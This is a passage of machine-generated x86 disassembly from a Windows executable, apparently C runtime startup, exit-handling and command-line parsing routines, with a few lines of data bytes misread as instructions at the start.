  424476:	gs ret 
  424478:	adc    cl,BYTE PTR [ebx+0x1a35106c]
  42447e:	imul   edi,DWORD PTR [edi],0xffffffef
  424481:	rol    DWORD PTR [ecx+ecx*1-0x21],1
  424485:	push   0xfb3446f2
  42448a:	retf   
  42448b:	inc    eax
  42448c:	xor    ecx,ebp
  42448e:	jbe    0x424478
  424490:	xchg   esi,eax
  424491:	jo     0x4244a0
  424493:	imul   edx,DWORD PTR [edi+eiz*8],0x39
  424497:	nop
  424498:	lahf   
  424499:	out    0x26,eax
  42449b:	retf   0xea6c
  42449e:	pusha  
  42449f:	data16 jecxz 0x424481
  4244a2:	lock push esi
  4244a4:	inc    esp
  4244a5:	imul   edi,edi,0x4
  4244a8:	lock and dh,BYTE PTR [ebx]
  4244ab:	mov    edi,0xde3a8f1c
  4244b0:	out    0x19,eax
  4244b2:	jge    0x42452e
  4244b4:	in     eax,dx
  4244b5:	inc    eax
  4244b6:	pop    esp
  4244b7:	call   0xf40ec1ce
  4244bc:	inc    esp
  4244bd:	or     eax,0xbc810a07
  4244c2:	fwait
  4244c3:	test   eax,0x6a006a
  4244c8:	call   0x4244f0
  4244cd:	push   0xa
  4244cf:	push   0x0
  4244d1:	push   0x0
  4244d3:	call   DWORD PTR ds:0x429054
  4244d9:	xor    eax,eax
  4244db:	add    esp,0x10
  4244de:	ret    0x10
  4244e1:	nop
  4244e2:	nop
  4244e3:	nop
  4244e4:	nop
  4244e5:	nop
  4244e6:	nop
  4244e7:	nop
  4244e8:	nop
  4244e9:	nop
  4244ea:	nop
  4244eb:	nop
  4244ec:	nop
  4244ed:	nop
  4244ee:	nop
  4244ef:	nop
  4244f0:	jmp    DWORD PTR ds:0x429144
  4244f6:	jmp    DWORD PTR ds:0x429140
  4244fc:	cmp    DWORD PTR ds:0x4635bc,0x1
  424503:	jne    0x42450a
  424505:	call   0x424a48
  42450a:	push   DWORD PTR [esp+0x4]
  42450e:	call   0x4248d1
  424513:	push   0xff
  424518:	call   DWORD PTR ds:0x462cb4
  42451e:	pop    ecx
  42451f:	pop    ecx
  424520:	ret    
  424521:	cmp    DWORD PTR ds:0x4635bc,0x1
  424528:	jne    0x42452f
  42452a:	call   0x424a48
  42452f:	push   DWORD PTR [esp+0x4]
  424533:	call   0x4248d1
  424538:	push   0xff
  42453d:	call   0x424717
  424542:	pop    ecx
  424543:	pop    ecx
  424544:	ret    
  424545:	push   0x60
  424547:	push   0x429268
  42454c:	call   0x425434
  424551:	mov    edi,0x94
  424556:	mov    eax,edi
  424558:	call   0x425480
  42455d:	mov    DWORD PTR [ebp-0x18],esp
  424560:	mov    esi,esp
  424562:	mov    DWORD PTR [esi],edi
  424564:	push   esi
  424565:	call   DWORD PTR ds:0x429098
  42456b:	mov    ecx,DWORD PTR [esi+0x10]
  42456e:	mov    DWORD PTR ds:0x4635c4,ecx
  424574:	mov    eax,DWORD PTR [esi+0x4]
  424577:	mov    ds:0x4635d0,eax
  42457c:	mov    edx,DWORD PTR [esi+0x8]
  42457f:	mov    DWORD PTR ds:0x4635d4,edx
  424585:	mov    esi,DWORD PTR [esi+0xc]
  424588:	and    esi,0x7fff
  42458e:	mov    DWORD PTR ds:0x4635c8,esi
  424594:	cmp    ecx,0x2
  424597:	je     0x4245a5
  424599:	or     esi,0x8000
  42459f:	mov    DWORD PTR ds:0x4635c8,esi
  4245a5:	shl    eax,0x8
  4245a8:	add    eax,edx
  4245aa:	mov    ds:0x4635cc,eax
  4245af:	xor    esi,esi
  4245b1:	push   esi
  4245b2:	mov    edi,DWORD PTR ds:0x42902c
  4245b8:	call   edi
  4245ba:	cmp    WORD PTR [eax],0x5a4d
  4245bf:	jne    0x4245e0
  4245c1:	mov    ecx,DWORD PTR [eax+0x3c]
  4245c4:	add    ecx,eax
  4245c6:	cmp    DWORD PTR [ecx],0x4550
  4245cc:	jne    0x4245e0
  4245ce:	movzx  eax,WORD PTR [ecx+0x18]
  4245d2:	cmp    eax,0x10b
  4245d7:	je     0x4245f8
  4245d9:	cmp    eax,0x20b
  4245de:	je     0x4245e5
  4245e0:	mov    DWORD PTR [ebp-0x1c],esi
  4245e3:	jmp    0x42460c
  4245e5:	cmp    DWORD PTR [ecx+0x84],0xe
  4245ec:	jbe    0x4245e0
  4245ee:	xor    eax,eax
  4245f0:	cmp    DWORD PTR [ecx+0xf8],esi
  4245f6:	jmp    0x424606
  4245f8:	cmp    DWORD PTR [ecx+0x74],0xe
  4245fc:	jbe    0x4245e0
  4245fe:	xor    eax,eax
  424600:	cmp    DWORD PTR [ecx+0xe8],esi
  424606:	setne  al
  424609:	mov    DWORD PTR [ebp-0x1c],eax
  42460c:	push   0x1
  42460e:	call   0x4253e3
  424613:	pop    ecx
  424614:	test   eax,eax
  424616:	jne    0x424620
  424618:	push   0x1c
  42461a:	call   0x424521
  42461f:	pop    ecx
  424620:	call   0x42535a
  424625:	test   eax,eax
  424627:	jne    0x424631
  424629:	push   0x10
  42462b:	call   0x424521
  424630:	pop    ecx
  424631:	call   0x425243
  424636:	mov    DWORD PTR [ebp-0x4],esi
  424639:	call   0x425045
  42463e:	test   eax,eax
  424640:	jge    0x42464a
  424642:	push   0x1b
  424644:	call   0x4244fc
  424649:	pop    ecx
  42464a:	call   DWORD PTR ds:0x429094
  424650:	mov    ds:0x463d74,eax
  424655:	call   0x424f23
  42465a:	mov    ds:0x4635b4,eax
  42465f:	call   0x424e81
  424664:	test   eax,eax
  424666:	jge    0x424670
  424668:	push   0x8
  42466a:	call   0x4244fc
  42466f:	pop    ecx
  424670:	call   0x424c4e
  424675:	test   eax,eax
  424677:	jge    0x424681
  424679:	push   0x9
  42467b:	call   0x4244fc
  424680:	pop    ecx
  424681:	call   0x424759
  424686:	mov    DWORD PTR [ebp-0x20],eax
  424689:	cmp    eax,esi
  42468b:	je     0x424694
  42468d:	push   eax
  42468e:	call   0x4244fc
  424693:	pop    ecx
  424694:	mov    DWORD PTR [ebp-0x38],esi
  424697:	lea    eax,[ebp-0x64]
  42469a:	push   eax
  42469b:	call   DWORD PTR ds:0x429090
  4246a1:	call   0x424be5
  4246a6:	mov    DWORD PTR [ebp-0x68],eax
  4246a9:	test   BYTE PTR [ebp-0x38],0x1
  4246ad:	je     0x4246b5
  4246af:	movzx  eax,WORD PTR [ebp-0x34]
  4246b3:	jmp    0x4246b8
  4246b5:	push   0xa
  4246b7:	pop    eax
  4246b8:	push   eax
  4246b9:	push   DWORD PTR [ebp-0x68]
  4246bc:	push   esi
  4246bd:	push   esi
  4246be:	call   edi
  4246c0:	push   eax
  4246c1:	call   0x423030
  4246c6:	mov    edi,eax
  4246c8:	mov    DWORD PTR [ebp-0x6c],edi
  4246cb:	cmp    DWORD PTR [ebp-0x1c],esi
  4246ce:	jne    0x4246d6
  4246d0:	push   edi
  4246d1:	call   0x424891
  4246d6:	call   0x4248b3
  4246db:	jmp    0x424708
  4246dd:	mov    eax,DWORD PTR [ebp-0x14]
  4246e0:	mov    ecx,DWORD PTR [eax]
  4246e2:	mov    ecx,DWORD PTR [ecx]
  4246e4:	mov    DWORD PTR [ebp-0x70],ecx
  4246e7:	push   eax
  4246e8:	push   ecx
  4246e9:	call   0x424a81
  4246ee:	pop    ecx
  4246ef:	pop    ecx
  4246f0:	ret    
  4246f1:	mov    esp,DWORD PTR [ebp-0x18]
  4246f4:	mov    edi,DWORD PTR [ebp-0x70]
  4246f7:	cmp    DWORD PTR [ebp-0x1c],0x0
  4246fb:	jne    0x424703
  4246fd:	push   edi
  4246fe:	call   0x4248a2
  424703:	call   0x4248c2
  424708:	or     DWORD PTR [ebp-0x4],0xffffffff
  42470c:	mov    eax,edi
  42470e:	lea    esp,[ebp-0x7c]
  424711:	call   0x42546f
  424716:	ret    
  424717:	push   0x429284
  42471c:	call   DWORD PTR ds:0x42902c
  424722:	test   eax,eax
  424724:	je     0x42473c
  424726:	push   0x429274
  42472b:	push   eax
  42472c:	call   DWORD PTR ds:0x429028
  424732:	test   eax,eax
  424734:	je     0x42473c
  424736:	push   DWORD PTR [esp+0x4]
  42473a:	call   eax
  42473c:	push   DWORD PTR [esp+0x4]
  424740:	call   DWORD PTR ds:0x42909c
  424746:	int3   
  424747:	push   0x8
  424749:	call   0x4255ef
  42474e:	pop    ecx
  42474f:	ret    
  424750:	push   0x8
  424752:	call   0x42555b
  424757:	pop    ecx
  424758:	ret    
  424759:	mov    eax,ds:0x463d70
  42475e:	test   eax,eax
  424760:	je     0x424764
  424762:	call   eax
  424764:	push   esi
  424765:	push   edi
  424766:	mov    ecx,0x42b00c
  42476b:	mov    edi,0x42b018
  424770:	xor    eax,eax
  424772:	cmp    ecx,edi
  424774:	mov    esi,ecx
  424776:	jae    0x42478f
  424778:	test   eax,eax
  42477a:	jne    0x4247bb
  42477c:	mov    ecx,DWORD PTR [esi]
  42477e:	test   ecx,ecx
  424780:	je     0x424784
  424782:	call   ecx
  424784:	add    esi,0x4
  424787:	cmp    esi,edi
  424789:	jb     0x424778
  42478b:	test   eax,eax
  42478d:	jne    0x4247bb
  42478f:	push   0x425287
  424794:	call   0x425700
  424799:	mov    esi,0x42b000
  42479e:	mov    eax,esi
  4247a0:	mov    edi,0x42b008
  4247a5:	cmp    eax,edi
  4247a7:	pop    ecx
  4247a8:	jae    0x4247b9
  4247aa:	mov    eax,DWORD PTR [esi]
  4247ac:	test   eax,eax
  4247ae:	je     0x4247b2
  4247b0:	call   eax
  4247b2:	add    esi,0x4
  4247b5:	cmp    esi,edi
  4247b7:	jb     0x4247aa
  4247b9:	xor    eax,eax
  4247bb:	pop    edi
  4247bc:	pop    esi
  4247bd:	ret    
  4247be:	push   ebp
  4247bf:	mov    ebp,esp
  4247c1:	push   esi
  4247c2:	push   edi
  4247c3:	push   0x8
  4247c5:	call   0x4255ef
  4247ca:	xor    esi,esi
  4247cc:	inc    esi
  4247cd:	cmp    DWORD PTR ds:0x463604,esi
  4247d3:	pop    ecx
  4247d4:	jne    0x4247e6
  4247d6:	push   DWORD PTR [ebp+0x8]
  4247d9:	call   DWORD PTR ds:0x429064
  4247df:	push   eax
  4247e0:	call   DWORD PTR ds:0x4290a0
  4247e6:	cmp    DWORD PTR [ebp+0xc],0x0
  4247ea:	mov    al,BYTE PTR [ebp+0x10]
  4247ed:	mov    DWORD PTR ds:0x463600,esi
  4247f3:	mov    ds:0x4635fc,al
  4247f8:	jne    0x42484c
  4247fa:	mov    ecx,DWORD PTR ds:0x463d68
  424800:	test   ecx,ecx
  424802:	je     0x42482d
  424804:	mov    eax,ds:0x463d64
  424809:	sub    eax,0x4
  42480c:	cmp    eax,ecx
  42480e:	jmp    0x424826
  424810:	mov    eax,DWORD PTR [eax]
  424812:	test   eax,eax
  424814:	je     0x424818
  424816:	call   eax
  424818:	mov    eax,ds:0x463d64
  42481d:	sub    eax,0x4
  424820:	cmp    eax,DWORD PTR ds:0x463d68
  424826:	mov    ds:0x463d64,eax
  42482b:	jae    0x424810
  42482d:	mov    eax,0x42b01c
  424832:	mov    esi,0x42b020
  424837:	cmp    eax,esi
  424839:	mov    edi,eax
  42483b:	jae    0x42484c
  42483d:	mov    eax,DWORD PTR [edi]
  42483f:	test   eax,eax
  424841:	je     0x424845
  424843:	call   eax
  424845:	add    edi,0x4
  424848:	cmp    edi,esi
  42484a:	jb     0x42483d
  42484c:	mov    eax,0x42b024
  424851:	mov    esi,0x42b028
  424856:	cmp    eax,esi
  424858:	mov    edi,eax
  42485a:	jae    0x42486b
  42485c:	mov    eax,DWORD PTR [edi]
  42485e:	test   eax,eax
  424860:	je     0x424864
  424862:	call   eax
  424864:	add    edi,0x4
  424867:	cmp    edi,esi
  424869:	jb     0x42485c
  42486b:	cmp    DWORD PTR [ebp+0x10],0x0
  42486f:	pop    edi
  424870:	pop    esi
  424871:	je     0x42487c
  424873:	push   0x8
  424875:	call   0x42555b
  42487a:	jmp    0x42488e
  42487c:	push   DWORD PTR [ebp+0x8]
  42487f:	mov    DWORD PTR ds:0x463604,0x1
  424889:	call   0x424717
  42488e:	pop    ecx
  42488f:	pop    ebp
  424890:	ret    
  424891:	push   0x0
  424893:	push   0x0
  424895:	push   DWORD PTR [esp+0xc]
  424899:	call   0x4247be
  42489e:	add    esp,0xc
  4248a1:	ret    
  4248a2:	push   0x0
  4248a4:	push   0x1
  4248a6:	push   DWORD PTR [esp+0xc]
  4248aa:	call   0x4247be
  4248af:	add    esp,0xc
  4248b2:	ret    
  4248b3:	push   0x1
  4248b5:	push   0x0
  4248b7:	push   0x0
  4248b9:	call   0x4247be
  4248be:	add    esp,0xc
  4248c1:	ret    
  4248c2:	push   0x1
  4248c4:	push   0x1
  4248c6:	push   0x0
  4248c8:	call   0x4247be
  4248cd:	add    esp,0xc
  4248d0:	ret    
  4248d1:	push   ebp
  4248d2:	mov    ebp,esp
  4248d4:	sub    esp,0x10c
  4248da:	mov    eax,ds:0x462f30
  4248df:	xor    eax,DWORD PTR [ebp+0x4]
  4248e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4248e5:	push   ebx
  4248e6:	push   esi
  4248e7:	mov    DWORD PTR [ebp-0x4],eax
  4248ea:	xor    edx,edx
  4248ec:	push   edi
  4248ed:	xor    eax,eax
  4248ef:	cmp    ecx,DWORD PTR [eax*8+0x462cc0]
  4248f6:	je     0x4248fe
  4248f8:	inc    eax
  4248f9:	cmp    eax,0x12
  4248fc:	jb     0x4248ef
  4248fe:	mov    esi,eax
  424900:	shl    esi,0x3
  424903:	cmp    ecx,DWORD PTR [esi+0x462cc0]
  424909:	jne    0x424a32
  42490f:	mov    eax,ds:0x4635bc
  424914:	cmp    eax,0x1
  424917:	je     0x424a0d
  42491d:	cmp    eax,edx
  42491f:	jne    0x42492e
  424921:	cmp    DWORD PTR ds:0x462cb8,0x1
  424928:	je     0x424a0d
  42492e:	cmp    ecx,0xfc
  424934:	je     0x424a32
  42493a:	push   0x104
  42493f:	lea    eax,[ebp-0x10c]
  424945:	push   eax
  424946:	push   edx
  424947:	mov    BYTE PTR [ebp-0x8],dl
  42494a:	call   DWORD PTR ds:0x4290a8
  424950:	test   eax,eax
  424952:	jne    0x424967
  424954:	lea    eax,[ebp-0x10c]
  42495a:	push   0x4295dc
  42495f:	push   eax
  424960:	call   0x425810
  424965:	pop    ecx
  424966:	pop    ecx
  424967:	lea    eax,[ebp-0x10c]
  42496d:	push   eax
  42496e:	lea    edi,[ebp-0x10c]
  424974:	call   0x425a40
  424979:	inc    eax
  42497a:	cmp    eax,0x3c
  42497d:	pop    ecx
  42497e:	jbe    0x4249a9
  424980:	lea    eax,[ebp-0x10c]
  424986:	push   eax
  424987:	call   0x425a40
  42498c:	mov    edi,eax
  42498e:	lea    eax,[ebp-0x10c]
  424994:	sub    eax,0x3b
  424997:	push   0x3
  424999:	add    edi,eax
  42499b:	push   0x4295d8
  4249a0:	push   edi
  4249a1:	call   0x425910
  4249a6:	add    esp,0x10
  4249a9:	push   edi
  4249aa:	call   0x425a40
  4249af:	push   DWORD PTR [esi+0x462cc4]
  4249b5:	mov    ebx,eax
  4249b7:	call   0x425a40
  4249bc:	lea    eax,[ebx+eax*1+0x1c]
  4249c0:	pop    ecx
  4249c1:	add    eax,0x3
  4249c4:	pop    ecx
  4249c5:	and    eax,0xfffffffc
  4249c8:	call   0x425480
  4249cd:	mov    ebx,esp
  4249cf:	push   0x4295bc
  4249d4:	push   ebx
  4249d5:	call   0x425810
  4249da:	push   edi
  4249db:	push   ebx
  4249dc:	call   0x425820
  4249e1:	push   0x4295b8
  4249e6:	push   ebx
  4249e7:	call   0x425820
  4249ec:	push   DWORD PTR [esi+0x462cc4]
  4249f2:	push   ebx
  4249f3:	call   0x425820
  4249f8:	push   0x12010
  4249fd:	push   0x429590
  424a02:	push   ebx
  424a03:	call   0x425712
  424a08:	add    esp,0x2c
  424a0b:	jmp    0x424a32
  424a0d:	push   edx
  424a0e:	lea    eax,[ebp+0x8]
  424a11:	push   eax
  424a12:	lea    esi,[esi+0x462cc4]
  424a18:	push   DWORD PTR [esi]
  424a1a:	call   0x425a40
  424a1f:	pop    ecx
  424a20:	push   eax
  424a21:	push   DWORD PTR [esi]
  424a23:	push   0xfffffff4
  424a25:	call   DWORD PTR ds:0x4290a4
  424a2b:	push   eax
  424a2c:	call   DWORD PTR ds:0x429080
  424a32:	lea    esp,[ebp-0x118]
  424a38:	mov    ecx,DWORD PTR [ebp-0x4]
  424a3b:	xor    ecx,DWORD PTR [ebp+0x4]
  424a3e:	call   0x425afc
  424a43:	pop    edi
  424a44:	pop    esi
  424a45:	pop    ebx
  424a46:	leave  
  424a47:	ret    
  424a48:	mov    eax,ds:0x4635bc
  424a4d:	cmp    eax,0x1
  424a50:	je     0x424a5f
  424a52:	test   eax,eax
  424a54:	jne    0x424a80
  424a56:	cmp    DWORD PTR ds:0x462cb8,0x1
  424a5d:	jne    0x424a80
  424a5f:	push   0xfc
  424a64:	call   0x4248d1
  424a69:	mov    eax,ds:0x463608
  424a6e:	test   eax,eax
  424a70:	pop    ecx
  424a71:	je     0x424a75
  424a73:	call   eax
  424a75:	push   0xff
  424a7a:	call   0x4248d1
  424a7f:	pop    ecx
  424a80:	ret    
  424a81:	push   ebp
  424a82:	mov    ebp,esp
  424a84:	push   ecx
  424a85:	push   ebx
  424a86:	push   esi
  424a87:	push   edi
  424a88:	call   0x4252e9
  424a8d:	mov    edi,DWORD PTR [ebp+0x8]
  424a90:	mov    esi,eax
  424a92:	mov    edx,DWORD PTR [esi+0x54]
  424a95:	mov    eax,ds:0x462dd4
  424a9a:	mov    ecx,edx
  424a9c:	cmp    DWORD PTR [ecx],edi
  424a9e:	je     0x424aad
  424aa0:	lea    ebx,[eax+eax*2]
  424aa3:	add    ecx,0xc
  424aa6:	lea    ebx,[edx+ebx*4]
  424aa9:	cmp    ecx,ebx
  424aab:	jb     0x424a9c
  424aad:	lea    eax,[eax+eax*2]
  424ab0:	lea    eax,[edx+eax*4]
  424ab3:	cmp    ecx,eax
  424ab5:	jae    0x424abb
  424ab7:	cmp    DWORD PTR [ecx],edi
  424ab9:	je     0x424abd
  424abb:	xor    ecx,ecx
  424abd:	test   ecx,ecx
  424abf:	je     0x424bd7
  424ac5:	mov    ebx,DWORD PTR [ecx+0x8]
  424ac8:	test   ebx,ebx
  424aca:	mov    DWORD PTR [ebp+0x8],ebx
  424acd:	je     0x424bd7
  424ad3:	cmp    ebx,0x5
  424ad6:	jne    0x424ae4
  424ad8:	and    DWORD PTR [ecx+0x8],0x0
  424adc:	xor    eax,eax
  424ade:	inc    eax
  424adf:	jmp    0x424be0
  424ae4:	cmp    ebx,0x1
  424ae7:	je     0x424bd2
  424aed:	mov    eax,DWORD PTR [esi+0x58]
  424af0:	mov    DWORD PTR [ebp-0x4],eax
  424af3:	mov    eax,DWORD PTR [ebp+0xc]
  424af6:	mov    DWORD PTR [esi+0x58],eax
  424af9:	mov    eax,DWORD PTR [ecx+0x4]
  424afc:	cmp    eax,0x8
  424aff:	jne    0x424bc4
  424b05:	mov    edx,DWORD PTR ds:0x462dc8
  424b0b:	mov    eax,ds:0x462dcc
  424b10:	add    eax,edx
  424b12:	cmp    edx,eax
  424b14:	jge    0x424b3d
  424b16:	lea    eax,[edx+edx*2]
  424b19:	shl    eax,0x2
  424b1c:	mov    edi,DWORD PTR [esi+0x54]
  424b1f:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424b24:	mov    edi,DWORD PTR ds:0x462dc8
  424b2a:	mov    ebx,DWORD PTR ds:0x462dcc
  424b30:	inc    edx
  424b31:	add    ebx,edi
  424b33:	add    eax,0xc
  424b36:	cmp    edx,ebx
  424b38:	jl     0x424b1c
  424b3a:	mov    ebx,DWORD PTR [ebp+0x8]
  424b3d:	mov    ecx,DWORD PTR [ecx]
  424b3f:	cmp    ecx,0xc000008e
  424b45:	mov    edi,DWORD PTR [esi+0x5c]
  424b48:	jne    0x424b53
  424b4a:	mov    DWORD PTR [esi+0x5c],0x83
  424b51:	jmp    0x424bb7
  424b53:	cmp    ecx,0xc0000090
  424b59:	jne    0x424b64
  424b5b:	mov    DWORD PTR [esi+0x5c],0x81
  424b62:	jmp    0x424bb7
  424b64:	cmp    ecx,0xc0000091
  424b6a:	jne    0x424b75
  424b6c:	mov    DWORD PTR [esi+0x5c],0x84
  424b73:	jmp    0x424bb7
  424b75:	cmp    ecx,0xc0000093
  424b7b:	jne    0x424b86
  424b7d:	mov    DWORD PTR [esi+0x5c],0x85
  424b84:	jmp    0x424bb7
  424b86:	cmp    ecx,0xc000008d
  424b8c:	jne    0x424b97
  424b8e:	mov    DWORD PTR [esi+0x5c],0x82
  424b95:	jmp    0x424bb7
  424b97:	cmp    ecx,0xc000008f
  424b9d:	jne    0x424ba8
  424b9f:	mov    DWORD PTR [esi+0x5c],0x86
  424ba6:	jmp    0x424bb7
  424ba8:	cmp    ecx,0xc0000092
  424bae:	jne    0x424bb7
  424bb0:	mov    DWORD PTR [esi+0x5c],0x8a
  424bb7:	push   DWORD PTR [esi+0x5c]
  424bba:	push   0x8
  424bbc:	call   ebx
  424bbe:	pop    ecx
  424bbf:	mov    DWORD PTR [esi+0x5c],edi
  424bc2:	jmp    0x424bcb
  424bc4:	and    DWORD PTR [ecx+0x8],0x0
  424bc8:	push   eax
  424bc9:	call   ebx
  424bcb:	mov    eax,DWORD PTR [ebp-0x4]
  424bce:	pop    ecx
  424bcf:	mov    DWORD PTR [esi+0x58],eax
  424bd2:	or     eax,0xffffffff
  424bd5:	jmp    0x424be0
  424bd7:	push   DWORD PTR [ebp+0xc]
  424bda:	call   DWORD PTR ds:0x4290ac
  424be0:	pop    edi
  424be1:	pop    esi
  424be2:	pop    ebx
  424be3:	leave  
  424be4:	ret    
  424be5:	cmp    DWORD PTR ds:0x463d6c,0x0
  424bec:	jne    0x424bf3
  424bee:	call   0x42601c
  424bf3:	push   esi
  424bf4:	mov    esi,DWORD PTR ds:0x463d74
  424bfa:	test   esi,esi
  424bfc:	jne    0x424c05
  424bfe:	mov    esi,0x4295f3
  424c03:	jmp    0x424c4a
  424c05:	mov    al,BYTE PTR [esi]
  424c07:	cmp    al,0x22
  424c09:	jne    0x424c33
  424c0b:	inc    esi
  424c0c:	mov    al,BYTE PTR [esi]
  424c0e:	cmp    al,0x22
  424c10:	je     0x424c43
  424c12:	test   al,al
  424c14:	je     0x424c2c
  424c16:	movzx  eax,al
  424c19:	push   eax
  424c1a:	call   0x425b3b
  424c1f:	test   eax,eax
  424c21:	pop    ecx
  424c22:	je     0x424c25
  424c24:	inc    esi
  424c25:	inc    esi
  424c26:	mov    al,BYTE PTR [esi]
  424c28:	cmp    al,0x22
  424c2a:	jne    0x424c12
  424c2c:	cmp    BYTE PTR [esi],0x22
  424c2f:	jne    0x424c44
  424c31:	jmp    0x424c43
  424c33:	cmp    al,0x20
  424c35:	jbe    0x424c44
  424c37:	inc    esi
  424c38:	cmp    BYTE PTR [esi],0x20
  424c3b:	ja     0x424c37
  424c3d:	jmp    0x424c44
  424c3f:	cmp    al,0x20
  424c41:	ja     0x424c4a
  424c43:	inc    esi
  424c44:	mov    al,BYTE PTR [esi]
  424c46:	test   al,al
  424c48:	jne    0x424c3f
  424c4a:	mov    eax,esi
  424c4c:	pop    esi
  424c4d:	ret    
  424c4e:	push   ebx
  424c4f:	xor    ebx,ebx
  424c51:	cmp    DWORD PTR ds:0x463d6c,ebx
  424c57:	push   esi
  424c58:	push   edi
  424c59:	jne    0x424c60
  424c5b:	call   0x42601c
  424c60:	mov    esi,DWORD PTR ds:0x4635b4
  424c66:	xor    edi,edi
  424c68:	cmp    esi,ebx
  424c6a:	jne    0x424c7e
  424c6c:	jmp    0x424c9e
  424c6e:	cmp    al,0x3d
  424c70:	je     0x424c73
  424c72:	inc    edi
  424c73:	push   esi
  424c74:	call   0x425a40
  424c79:	pop    ecx
  424c7a:	lea    esi,[esi+eax*1+0x1]
  424c7e:	mov    al,BYTE PTR [esi]
  424c80:	cmp    al,bl
  424c82:	jne    0x424c6e
  424c84:	lea    eax,[edi*4+0x4]
  424c8b:	push   eax
  424c8c:	call   0x426152
  424c91:	mov    edi,eax
  424c93:	cmp    edi,ebx
  424c95:	pop    ecx
  424c96:	mov    DWORD PTR ds:0x4635e4,edi
  424c9c:	jne    0x424ca3
  424c9e:	or     eax,0xffffffff
  424ca1:	jmp    0x424cfb
  424ca3:	mov    esi,DWORD PTR ds:0x4635b4
  424ca9:	push   ebp
  424caa:	jmp    0x424cd6
  424cac:	push   esi
  424cad:	call   0x425a40
  424cb2:	mov    ebp,eax
  424cb4:	inc    ebp
  424cb5:	cmp    BYTE PTR [esi],0x3d
  424cb8:	pop    ecx
  424cb9:	je     0x424cd4
  424cbb:	push   ebp
  424cbc:	call   0x426152
  424cc1:	cmp    eax,ebx
  424cc3:	pop    ecx
  424cc4:	mov    DWORD PTR [edi],eax
  424cc6:	je     0x424cff
  424cc8:	push   esi
  424cc9:	push   eax
  424cca:	call   0x425810
  424ccf:	pop    ecx
  424cd0:	pop    ecx
  424cd1:	add    edi,0x4
  424cd4:	add    esi,ebp
  424cd6:	cmp    BYTE PTR [esi],bl
  424cd8:	jne    0x424cac
  424cda:	push   DWORD PTR ds:0x4635b4
  424ce0:	call   0x42603a
  424ce5:	mov    DWORD PTR ds:0x4635b4,ebx
  424ceb:	mov    DWORD PTR [edi],ebx
  424ced:	mov    DWORD PTR ds:0x463d60,0x1
  424cf7:	xor    eax,eax
  424cf9:	pop    ecx
  424cfa:	pop    ebp
  424cfb:	pop    edi
  424cfc:	pop    esi
  424cfd:	pop    ebx
  424cfe:	ret    
  424cff:	push   DWORD PTR ds:0x4635e4
  424d05:	call   0x42603a
  424d0a:	mov    DWORD PTR ds:0x4635e4,ebx
  424d10:	or     eax,0xffffffff
  424d13:	jmp    0x424cf9
  424d15:	push   ebp
  424d16:	mov    ebp,esp
  424d18:	push   ecx
  424d19:	push   ebx
  424d1a:	mov    ebx,DWORD PTR [ebp+0xc]
  424d1d:	xor    edx,edx
  424d1f:	cmp    DWORD PTR [ebp+0x8],edx
  424d22:	push   edi
  424d23:	mov    DWORD PTR [esi],edx
  424d25:	mov    edi,ecx
  424d27:	mov    DWORD PTR [ebx],0x1
  424d2d:	je     0x424d38
  424d2f:	mov    ecx,DWORD PTR [ebp+0x8]
  424d32:	add    DWORD PTR [ebp+0x8],0x4
  424d36:	mov    DWORD PTR [ecx],edi
  424d38:	cmp    BYTE PTR [eax],0x22
  424d3b:	jne    0x424d4b
  424d3d:	xor    ecx,ecx
  424d3f:	test   edx,edx
  424d41:	sete   cl
  424d44:	inc    eax
  424d45:	mov    edx,ecx
  424d47:	mov    cl,0x22
  424d49:	jmp    0x424d78
  424d4b:	inc    DWORD PTR [esi]
  424d4d:	test   edi,edi
  424d4f:	je     0x424d56
  424d51:	mov    cl,BYTE PTR [eax]
  424d53:	mov    BYTE PTR [edi],cl
  424d55:	inc    edi
  424d56:	mov    cl,BYTE PTR [eax]
  424d58:	movzx  ebx,cl
  424d5b:	inc    eax
  424d5c:	test   BYTE PTR [ebx+0x463a21],0x4
  424d63:	je     0x424d71
  424d65:	inc    DWORD PTR [esi]
  424d67:	test   edi,edi
  424d69:	je     0x424d70
  424d6b:	mov    bl,BYTE PTR [eax]
  424d6d:	mov    BYTE PTR [edi],bl
  424d6f:	inc    edi
  424d70:	inc    eax
  424d71:	test   cl,cl
  424d73:	mov    ebx,DWORD PTR [ebp+0xc]
  424d76:	je     0x424daa
  424d78:	test   edx,edx
  424d7a:	jne    0x424d38
  424d7c:	cmp    cl,0x20
  424d7f:	je     0x424d86
  424d81:	cmp    cl,0x9
  424d84:	jne    0x424d38
  424d86:	test   edi,edi
  424d88:	je     0x424d8e
  424d8a:	and    BYTE PTR [edi-0x1],0x0
  424d8e:	and    DWORD PTR [ebp-0x4],0x0
  424d92:	cmp    BYTE PTR [eax],0x0
  424d95:	je     0x424e71
  424d9b:	mov    cl,BYTE PTR [eax]
  424d9d:	cmp    cl,0x20
  424da0:	je     0x424da7
  424da2:	cmp    cl,0x9
  424da5:	jne    0x424dad
  424da7:	inc    eax
  424da8:	jmp    0x424d9b
  424daa:	dec    eax
  424dab:	jmp    0x424d8e
  424dad:	cmp    BYTE PTR [eax],0x0
  424db0:	je     0x424e71
  424db6:	cmp    DWORD PTR [ebp+0x8],0x0
  424dba:	je     0x424dc5
  424dbc:	mov    ecx,DWORD PTR [ebp+0x8]
  424dbf:	add    DWORD PTR [ebp+0x8],0x4
  424dc3:	mov    DWORD PTR [ecx],edi
  424dc5:	inc    DWORD PTR [ebx]
  424dc7:	xor    ebx,ebx
  424dc9:	inc    ebx
  424dca:	xor    edx,edx
  424dcc:	jmp    0x424dd0
  424dce:	inc    eax
  424dcf:	inc    edx
  424dd0:	cmp    BYTE PTR [eax],0x5c
  424dd3:	je     0x424dce
  424dd5:	cmp    BYTE PTR [eax],0x22
  424dd8:	jne    0x424e00
  424dda:	test   dl,0x1
  424ddd:	jne    0x424dfe
  424ddf:	cmp    DWORD PTR [ebp-0x4],0x0
  424de3:	je     0x424df1
  424de5:	lea    ecx,[eax+0x1]
  424de8:	cmp    BYTE PTR [ecx],0x22
  424deb:	jne    0x424df1
  424ded:	mov    eax,ecx
  424def:	jmp    0x424df3
  424df1:	xor    ebx,ebx
  424df3:	xor    ecx,ecx
  424df5:	cmp    DWORD PTR [ebp-0x4],ecx
  424df8:	sete   cl
  424dfb:	mov    DWORD PTR [ebp-0x4],ecx
  424dfe:	shr    edx,1
  424e00:	test   edx,edx
  424e02:	je     0x424e11
  424e04:	test   edi,edi
  424e06:	je     0x424e0c
  424e08:	mov    BYTE PTR [edi],0x5c
  424e0b:	inc    edi
  424e0c:	inc    DWORD PTR [esi]
